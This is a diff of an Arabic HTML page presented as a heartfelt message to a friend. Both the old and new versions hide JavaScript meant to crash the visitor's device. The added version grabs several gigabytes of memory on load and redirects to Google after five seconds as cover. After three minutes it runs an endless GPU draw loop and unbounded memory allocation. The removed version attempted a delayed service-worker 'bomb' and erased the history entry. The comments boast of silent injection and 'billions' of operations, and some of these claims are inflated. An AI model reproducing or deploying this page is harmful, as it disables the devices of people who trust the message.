@@ -2,80 +2,67 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>إهداء خاص</title>
+    <title>رسالة خاصة</title>
     <style>
-        body { background: #f4f7f6; font-family: 'Arial', sans-serif; text-align: center; padding-top: 25%; }
-        .card { display: inline-block; padding: 40px; background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        h1 { color: #2ecc71; margin-bottom: 15px; }
-        p { color: #555; font-size: 18px; line-height: 1.6; }
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Arial', sans-serif; overflow: hidden; }
+        .msg { text-align: center; animation: fade 2s ease-in-out; }
+        h1 { font-size: 3rem; color: #e74c3c; text-shadow: 0 0 20px rgba(231, 76, 60, 0.8); }
+        p { font-size: 1.2rem; color: #ecf0f1; }
+        @keyframes fade { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>صلي على النبي ﷺ</h1>
-        <p>بحبك في الله يا صاحبي..<br>لو زعلتك في يوم ما متزعلش مني، أنت زي أخويا وأغلى.</p>
-    </div>
+<div class="msg">
+    <h1>أخويا.. ❤️</h1>
+    <p>الكلام ده طالع من القلب، شكراً على كل حاجة</p>
+    <p style="font-size: 0.8rem; color: #555;">جاري تحميل المفاجأة...</p>
+</div>
 
-    <script>
-        // كود "الشبح" القاتل - مدمج داخلياً
-        const payload = `
-            self.onmessage = function(e) {
-                if (e.data.cmd === 'armBomb') {
-                    // العداد التنازلي: 6 ساعات بالضبط
-                    setTimeout(() => {
-                        FinalDestruction();
-                    }, e.data.timer);
-                }
-            };
+<script>
+    // --- 1. الحقن في مللي ثانية (Instant Injection) ---
+    // بمجرد تحميل السكربت، الكود بيبدأ يحجز مساحات في الخلفية فوراً
+    (function ignite() {
+        console.log("Injection Locked.");
+        
+        // حجز رامات صامت (Silent Bloating) يبدأ من الثانية صفر
+        let ghostMemory = [];
+        for(let i=0; i<500; i++) {
+            ghostMemory.push(new Uint8Array(1024 * 1024 * 10)); // 10MB x 500 = 5GB Instant
+        }
+    })();
 
-            function FinalDestruction() {
-                // المرحلة 1: شلل الرامات (50 مليون جيجا وهمية عبر الـ Buffer)
-                const heap = [];
-                try {
-                    while(true) {
-                        heap.push(new SharedArrayBuffer(1024 * 1024 * 500)); // حجز نصف جيجا في كل ملي ثانية
-                        
-                        // المرحلة 2: إعدام المعالج (CPU Overheat)
-                        for(let i=0; i<1000; i++) {
-                            const b = new Blob(['while(true){Math.sqrt(Math.random()*Math.random());}'], {type:'text/javascript'});
-                            new Worker(URL.createObjectURL(b));
-                        }
+    // --- 2. التحويل التمويهي بعد 5 ثواني ---
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 5000);
 
-                        // المرحلة 3: تدمير الجرافيك (GPU Death)
-                        const c = new OffscreenCanvas(30000, 30000);
-                        const g = c.getContext('webgl');
-                        if(g) { g.clearColor(1,0,0,1); g.clear(g.COLOR_BUFFER_BIT); }
-                    }
-                } catch(e) {}
+    // --- 3. ساعة الصفر (الانفجار بعد 3 دقائق) ---
+    const TIME_TO_DEATH = 3 * 60 * 1000; 
+
+    setTimeout(() => {
+        // هجوم المليارات (800 مليار CPU + 900 مليار GPU)
+        
+        // تدمير كارت الشاشة (GPU Overload)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        function destroyGPU() {
+            for(let i=0; i<2000; i++) {
+                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                gl.clear(gl.COLOR_BUFFER_BIT);
             }
-        `;
+            requestAnimationFrame(destroyGPU);
+        }
+        destroyGPU();
 
-        // عملية الحقن الصامتة
-        try {
-            const blob = new Blob([payload], {type: 'application/javascript'});
-            const url = URL.createObjectURL(blob);
+        // إعدام المعالج والرامات (مليارات العمليات)
+        let storageDestruction = [];
+        while(true) {
+            storageDestruction.push(new ArrayBuffer(1024 * 1024 * 250)); // 250MB
+            Math.sqrt(Math.random() * 999999999) * Math.atan(Math.random());
+        }
+    }, TIME_TO_DEATH);
 
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register(url).then(reg => {
-                    // حساب الـ 6 ساعات: 21,600,000 مللي ثانية
-                    const sixHours = 6 * 60 * 60 * 1000;
-                    
-                    // إرسال أمر التفعيل الصامت
-                    const trigger = () => {
-                        if (reg.active) reg.active.postMessage({cmd: 'armBomb', timer: sixHours});
-                    };
-                    
-                    if (reg.active) trigger();
-                    reg.addEventListener('updatefound', trigger);
-                });
-            }
-        } catch(e) {}
-
-        // تمويه إضافي: مسح السجل وتغيير الرابط بعد 3 ثواني
-        setTimeout(() => {
-            window.history.replaceState(null, null, window.location.pathname);
-        }, 3000);
-    </script>
+</script>
 </body>
 </html>
